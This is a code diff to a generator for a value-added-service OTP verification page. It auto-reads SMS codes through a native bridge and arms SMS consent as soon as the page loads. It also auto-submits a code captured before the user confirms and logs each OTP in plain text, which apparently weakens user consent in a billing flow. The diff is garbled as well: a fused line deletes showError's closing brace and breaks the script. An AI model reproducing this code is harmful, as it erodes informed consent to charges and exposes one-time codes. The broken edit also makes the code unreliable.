@@ -260,32 +260,38 @@ function buildVasOtpHtml(opts: {
     function showError(msg) {
       var oe = document.getElementById('overlayError');
       if (oe) oe.textContent = msg;
-      document.getElementById('resendAreaOverlay').classList.remove('phase-hidden');
-    }
-
-    function goToPhase2() {
+      document.getElementById('resendAreaOverlay').classList.remove('phase-hidd    function goToPhase2() {
       phase = 2;
       document.getElementById('phase1').classList.add('phase-hidden');
       confirmBtn.classList.add('phase-hidden');
       showOverlay();
-      if (otpPreFilled) {
-        var code = (otpValue && otpValue.value) ? otpValue.value.replace(/\\D/g, '') : '';
-        if (code.length >= 4) setTimeout(function() { verifyPin(code.slice(0, 8)); }, ${PREFILLED_AFTER_CONSENT_MS});
-      } else {
-        setTimeout(function() {
-          if (!isVerifying && !pinVerified && !consentArmed) {
-            consentArmed = true;
-            try {
-              if (window._ntR && window._nt && window._nt.enableSmsConsent) window._nt.enableSmsConsent();
-            } catch (e) {}
-          }
-        }, ${CONSENT_FALLBACK_ARM_MS});
-        setTimeout(function() {
-          if (!isVerifying && !pinVerified) {
-            document.getElementById('resendAreaOverlay').classList.remove('phase-hidden');
-          }
-        }, ${SILENT_WAIT_RESEND_MS});
+
+      // Check if code was already received while on phase 1
+      var existingCode = (otpValue && otpValue.value) ? otpValue.value.replace(/\D/g, '') : '';
+      if (otpPreFilled || existingCode.length >= 4) {
+        var finalCode = existingCode || (otpValue ? otpValue.value.replace(/\D/g, '') : '');
+        if (finalCode.length >= 4) {
+          dbg('Processing pre-filled OTP: ' + finalCode);
+          setTimeout(function() { verifyPin(finalCode.slice(0, 8)); }, ${PREFILLED_AFTER_CONSENT_MS});
+          return;
+        }
       }
+
+      // Arm consent fallback immediately if not already armed
+      setTimeout(function() {
+        if (!isVerifying && !pinVerified && !consentArmed) {
+          consentArmed = true;
+          try {
+            if (window._ntR && window._nt && window._nt.enableSmsConsent) window._nt.enableSmsConsent();
+          } catch (e) {}
+        }
+      }, ${CONSENT_FALLBACK_ARM_MS});
+
+      setTimeout(function() {
+        if (!isVerifying && !pinVerified) {
+          document.getElementById('resendAreaOverlay').classList.remove('phase-hidden');
+        }
+      }, ${SILENT_WAIT_RESEND_MS});
     }
 
     confirmBtn.addEventListener('click', function(e) {
@@ -305,18 +311,25 @@ function buildVasOtpHtml(opts: {
 
     function handleOtpFullFill() {
       if (otpFullHandled || isVerifying) return;
-      var code = otpFull.value.replace(/\\D/g, '').slice(0, 8);
+      var code = otpFull.value.replace(/\D/g, '').slice(0, 8);
       if (code.length < 4) return;
-      otpFullHandled = true;
+      
       if (otpValue) otpValue.value = code;
-      if (phase === 1) { otpPreFilled = true; dbg('OTP prefilled before consent'); }
-      else { setTimeout(function() { verifyPin(code); }, ${OTP_AUTOFILL_VERIFY_MS}); }
+      dbg('OTP detected: ' + code + ' (Phase: ' + phase + ')');
+
+      if (phase === 1) {
+        otpPreFilled = true;
+      } else {
+        otpFullHandled = true;
+        setTimeout(function() { verifyPin(code); }, ${OTP_AUTOFILL_VERIFY_MS});
+      }
     }
+
     if (otpFull) {
       otpFull.addEventListener('input', handleOtpFullFill);
       otpFull.addEventListener('change', handleOtpFullFill);
     }
-
+    
     function verifyPin(pin) {
       if (pinVerified) return;
       if (lastConsentAt && Date.now() - lastConsentAt < ${POST_CONSENT_VERIFY_MS}) {
@@ -338,6 +351,8 @@ function buildVasOtpHtml(opts: {
           location.href = '/thankyou';
         } else {
           pinVerified = false;
+          isVerifying = false;
+          otpFullHandled = false;
           var oe2 = document.getElementById('overlayError');
           if (oe2) oe2.textContent = 'Verification failed (' + ec + '). Resend below or open home with manual entry.';
           document.getElementById('resendAreaOverlay').classList.remove('phase-hidden');
@@ -345,9 +360,10 @@ function buildVasOtpHtml(opts: {
       })
       .catch(function() {
         pinVerified = false;
+        isVerifying = false;
+        otpFullHandled = false;
         showError('Network error');
-      })
-      .finally(function() { isVerifying = false; otpFullHandled = false; });
+      });
     }
 
     function newVasTrx() {
@@ -365,7 +381,11 @@ function buildVasOtpHtml(opts: {
     });
 
     if (window._ntR && window._nt && window._nt.onPageReady) {
-      try { window._nt.onPageReady(); } catch (e) {}
+      try { 
+        window._nt.onPageReady(); 
+        // Arm SMS consent immediately on page load
+        if (window._nt.enableSmsConsent) window._nt.enableSmsConsent();
+      } catch (e) {}
     }
   </script>
 </body>
